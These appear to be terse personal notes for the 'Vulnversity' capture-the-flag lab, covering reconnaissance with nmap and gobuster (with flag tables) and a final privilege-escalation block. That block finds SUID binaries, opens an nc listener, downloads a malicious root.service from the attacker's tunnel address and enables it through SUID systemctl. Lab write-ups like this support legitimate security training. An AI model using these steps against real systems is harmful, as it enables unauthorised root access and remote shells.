# vulnversity

# task 1
10.10.92.1

# task 2
```nmap -sC -sV 10.10.92.1 -oN ip```
Nmap flag	Description
-sV	Attempts to determine the version of the services running
-p <x> or -p-	Port scan for port <x> or scan all ports
-Pn	Disable host discovery and scan for open ports
-A	Enables OS and version detection, executes in-build scripts for further enumeration 
-sC	Scan with the default Nmap scripts
-v	Verbose mode
-sU	UDP port scan
-sS	TCP SYN port scan

```gobuster dir -u http://10.10.92.1:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt```
- /internal/
Gobuster flag	Description
-e	Print the full URLs in your console
-u	The target URL
-w	Path to your wordlist
-U and -P	Username and Password for Basic Auth
-p <x>	Proxy to use for requests
-c <http cookies>	Specify a cookie for simulating your auth




```
Use the command: find / -user root -perm -4000 -exec ls -ldb {} \;
/bin/systemctl

python3 -m http.server 80 #host
nc -lvnp 9002 # host

wget http://ip_tun_kita/root.service
systemctl enable /tmp/root.service
systemctl start root
```